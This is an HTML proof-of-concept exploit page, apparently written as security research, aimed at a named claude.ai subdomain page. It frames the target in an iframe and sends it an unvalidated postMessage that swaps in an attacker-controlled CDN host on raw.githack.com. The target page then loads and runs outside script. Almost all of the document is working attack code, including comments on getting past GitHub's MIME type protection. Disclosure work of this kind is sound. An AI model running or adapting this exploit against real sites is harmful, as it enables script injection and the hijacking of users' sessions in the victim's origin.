<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Anthropic Staging PoC - Domain Hijack</title>
    <style>
        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
        #status { color: #d9534f; font-weight: bold; }
        iframe { border: 1px solid #ccc; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Security Research: Isolated Segment PoC</h1>
    <p>Target: <code>https://a.claude.ai/isolated-segment.html</code></p>
    <p>Status: <span id="status">Waiting for iframe...</span></p>

    <iframe id="target-iframe" 
            src="https://a.claude.ai/isolated-segment.html?v=" 
            width="600" height="400"></iframe>

    <script>
        const iframe = document.getElementById('target-iframe');
        const status = document.getElementById('status');

        // This is your Githack-proxied path to bypass GitHub's MIME type security
        // It points to the root of your folder structure
        const GITHACK_HOST = "raw.githack.com/CloudWaddie/anthropic-poc/main";

        window.addEventListener('message', (event) => {
            // Verify message is from the segment script
            if (event.data.source === 'isolated-segment' && event.data.type === 'iframe_ready') {
                status.innerText = "Iframe Ready. Sending Exploit...";
                status.style.color = "orange";

                // Trigger the vulnerability by injecting our own cdnHost
                iframe.contentWindow.postMessage({
                    target: "isolated-segment",
                    type: "init",
                    writeKey: "poc-key", 
                    cdnHost: GITHACK_HOST
                }, "*"); 
            }

            if (event.data.type === 'segment_initialized') {
                status.innerText = "Exploit Sent! Check for Alert/Console logs.";
                status.style.color = "green";
            }
        });
    </script>
</body>
</html>
